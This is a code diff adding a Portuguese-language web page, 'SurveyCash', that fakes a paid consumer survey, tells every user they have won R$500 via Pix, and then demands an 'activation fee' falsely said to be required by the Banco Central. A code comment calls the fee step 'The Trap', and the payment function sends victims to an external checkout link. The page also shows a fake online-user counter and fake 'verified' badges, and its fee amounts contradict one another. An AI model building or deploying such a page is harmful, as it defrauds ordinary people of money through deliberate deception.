@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Pesquisas Remuneradas - Brasil</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .step-hidden { display: none; }
+        .progress-bar { transition: width 0.4s ease-in-out; }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-900">
+
+    <!-- Header -->
+    <header class="bg-white border-b border-slate-200 py-4 px-6 flex justify-between items-center sticky top-0 z-50">
+        <div class="flex items-center gap-2">
+            <div class="bg-blue-600 p-1.5 rounded-lg">
+                <i data-lucide="clipboard-check" class="text-white w-5 h-5"></i>
+            </div>
+            <span class="font-bold text-lg tracking-tight">Survey<span class="text-blue-600">Cash</span></span>
+        </div>
+        <div class="flex items-center gap-2 text-sm font-medium text-green-600 bg-green-50 px-3 py-1 rounded-full border border-green-100">
+            <span class="relative flex h-2 w-2">
+                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+            </span>
+            1.248 pessoas online
+        </div>
+    </header>
+
+    <main class="max-w-2xl mx-auto px-4 py-8">
+        
+        <!-- STEP 1: Landing Page -->
+        <div id="step-1" class="text-center space-y-6 py-12">
+            <div class="inline-block bg-blue-100 text-blue-700 text-xs font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-2">
+                Oportunidade Limitada
+            </div>
+            <h1 class="text-4xl font-extrabold leading-tight">Ganhe <span class="text-blue-600">R$ 500,00</span> respondendo a nossa pesquisa de consumo.</h1>
+            <p class="text-slate-600 text-lg">Estamos selecionando 50 brasileiros para testar novos produtos. Leva menos de 3 minutos.</p>
+            
+            <div class="bg-white p-6 rounded-2xl shadow-sm border border-slate-200 space-y-4 text-left">
+                <div class="flex items-start gap-3">
+                    <i data-lucide="check-circle-2" class="text-green-500 w-5 h-5 mt-1"></i>
+                    <p class="text-sm text-slate-600">Pagamento imediato via <strong>Pix</strong></p>
+                </div>
+                <div class="flex items-start gap-3">
+                    <i data-lucide="check-circle-2" class="text-green-500 w-5 h-5 mt-1"></i>
+                    <p class="text-sm text-slate-600">Sem necessidade de cadastro complexo</p>
+                </div>
+                <div class="flex items-start gap-3">
+                    <i data-lucide="check-circle-2" class="text-green-500 w-5 h-5 mt-1"></i>
+                    <p class="text-sm text-slate-600">Disponível para qualquer idade</p>
+                </div>
+            </div>
+
+            <button onclick="nextStep(2)" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-xl transition-all transform hover:scale-[1.02] active:scale-95 shadow-lg shadow-blue-200">
+                Começar Pesquisa Agora
+            </button>
+        </div>
+
+        <!-- STEP 2: Questionnaire -->
+        <div id="step-2" class="step-hidden space-y-6">
+            <div class="bg-white p-6 rounded-2xl shadow-sm border border-slate-200">
+                <div class="flex justify-between items-center mb-4">
+                    <span class="text-sm font-medium text-slate-500">Progresso da Pesquisa</span>
+                    <span id="progress-text" class="text-sm font-bold text-blue-600">20%</span>
+                </div>
+                <div class="w-full bg-slate-100 h-3 rounded-full overflow-hidden">
+                    <div id="progress-bar" class="progress-bar bg-blue-600 h-full w-[20%]"></div>
+                </div>
+            </div>
+
+            <div id="question-container" class="bg-white p-8 rounded-2xl shadow-sm border border-slate-200 space-y-6">
+                <!-- Questions will be injected here by JS -->
+            </div>
+        </div>
+
+        <!-- STEP 3: Victory Screen -->
+        <div id="step-3" class="step-hidden text-center space-y-8 py-8">
+            <div class="relative inline-block">
+                <div class="absolute -inset-4 bg-yellow-400 rounded-full blur-xl opacity-30 animate-pulse"></div>
+                <div class="relative bg-white p-4 rounded-full shadow-xl">
+                    <i data-lucide="trophy" class="w-16 h-16 text-yellow-500"></i>
+                </div>
+            </div>
+            
+            <div class="space-y-2">
+                <h2 class="text-3xl font-extrabold">Parabéns! Você foi selecionado!</h2>
+                <p class="text-slate-600">Seu perfil é exatamente o que procuramos para esta campanha.</p>
+            </div>
+
+            <div class="bg-green-50 border-2 border-green-200 p-6 rounded-2xl space-y-4">
+                <p class="text-green-800 font-medium uppercase text-xs tracking-widest">Saldo Disponível para Saque</p>
+                <div class="text-5xl font-black text-green-600">R$ 500,00</div>
+                <div class="flex justify-center gap-2">
+                    <span class="bg-green-200 text-green-700 text-[10px] font-bold px-2 py-0.5 rounded">VERIFICADO</span>
+                    <span class="bg-green-200 text-green-700 text-[10px] font-bold px-2 py-0.5 rounded">PIX IMEDIATO</span>
+                </div>
+            </div>
+
+            <button onclick="nextStep(4)" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-xl text-xl transition-all shadow-lg shadow-green-200">
+                Resgatar meu Pix Agora
+            </button>
+        </div>
+
+        <!-- STEP 4: The Fee (The Trap) -->
+        <div id="step-4" class="step-hidden space-y-6">
+            <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-200 space-y-6">
+                <div class="flex items-center gap-3 text-amber-600 bg-amber-50 p-4 rounded-xl border border-amber-100">
+                    <i data-lucide="alert-triangle" class="w-6 h-6"></i>
+                    <p class="text-sm font-medium">Atenção: Verificação de Conta Necessária</p>
+                </div>
+
+                <div class="space-y-4">
+                    <h3 class="text-xl font-bold">Liberação de Fundos</h3>
+                    <p class="text-slate-600 text-sm leading-relaxed">
+                        Para evitar fraudes e contas duplicadas, o Banco Central exige a ativação da conta de recebimento através de um <strong>depósito de verificação</strong>. 
+                        <br><br>
+                        Este valor de <strong>R$ 27,90</strong> será estornado automaticamente junto com o seu prêmio de R$ 500,00, totalizando um saque de <strong>R$ 527,90</strong>.
+                    </p>
+                </div>
+
+                <div class="bg-slate-50 p-4 rounded-xl border border-slate-200 space-y-3">
+                    <div class="flex justify-between text-sm">
+                        <span class="text-slate-500">Valor do Prêmio:</span>
+                        <span class="font-bold text-green-600">+ R$ 500,00</span>
+                    </div>
+                    <div class="flex justify-between text-sm">
+                        <span class="text-slate-500">Taxa de Ativação:</span>
+                        <span class="font-bold text-red-500">- R$ 15,90</span>
+                    </div>
+                    <div class="border-t border-slate-200 pt-3 flex justify-between font-bold text-lg">
+                        <span>Total a Receber:</span>
+                        <span class="text-blue-600">R$ 515,90</span>
+                    </div>
+                </div>
+
+                <button onclick="handlePayment()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition-all flex items-center justify-center gap-2">
+                    <i data-lucide="zap" class="w-5 h-5"></i>
+                    Pagar Taxa e Liberar Pix
+                </button>
+                <p class="text-center text-[10px] text-slate-400 uppercase tracking-tighter">Processamento seguro via Gateway de Pagamentos Criptografado</p>
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+        // Initialize Lucide Icons
+        lucide.createIcons();
+
+        const questions = [
+            { q: "Qual a sua faixa etária?", options: ["18-24", "25-34", "35-44", "45+"] },
+            { q: "Você costuma fazer compras online?", options: ["Sim, frequentemente", "Às vezes", "Raramente", "Nunca"] },
+            { q: "Qual sua principal rede social?", options: ["Instagram", "TikTok", "Facebook", "WhatsApp"] },
+            { q: "Você possui conta em banco digital?", options: ["Sim", "Não", "Estou abrindo uma"] },
+            { q: "Quanto você gasta em média por mês com lazer?", options: ["Até R$ 100", "R$ 100 - R$ 500", "R$ 500 - R$ 1000", "Mais de R$ 1000"] }
+        ];
+
+        let currentQuestion = 0;
+
+        function nextStep(step) {
+            document.querySelectorAll('main > div').forEach(div => div.classList.add('step-hidden'));
+            document.getElementById(`step-${step}`).classList.remove('step-hidden');
+            window.scrollTo(0, 0);
+            
+            if(step === 2) {
+                loadQuestion();
+            }
+        }
+
+        function loadQuestion() {
+            const container = document.getElementById('question-container');
+            const q = questions[currentQuestion];
+            
+            container.innerHTML = `
+                <h3 class="text-xl font-bold text-slate-800">${q.q}</h3>
+                <div class="grid grid-cols-1 gap-3">
+                    ${q.options.map(opt => `
+                        <button onclick="answerQuestion()" class="text-left p-4 rounded-xl border border-slate-200 hover:border-blue-500 hover:bg-blue-50 transition-all font-medium text-slate-700">
+                            ${opt}
+                        </button>
+                    `).join('')}
+                </div>
+            `;
+        }
+
+        function answerQuestion() {
+            currentQuestion++;
+            const progress = Math.round(((currentQuestion) / questions.length) * 100);
+            
+            document.getElementById('progress-bar').style.width = `${progress}%`;
+            document.getElementById('progress-text').innerText = `${progress}%`;
+
+            if (currentQuestion < questions.length) {
+                loadQuestion();
+            } else {
+                nextStep(3);
+            }
+        }
+
+        function handlePayment() {
+            // Aqui você redireciona para o seu link de checkout (Mercado Pago, Stripe, etc)
+            // exemplo window.location.href = "https://checkout.lofypay.com/0ea6df4a5e5bb188";
+            alert("copie e cole esse link em seu navegador e pague a pequena taxa e receba 515,19$. https://checkout.lofypay.com/0ea6df4a5e5bb188");
+        }
+    </script>
+</body>
+</html>
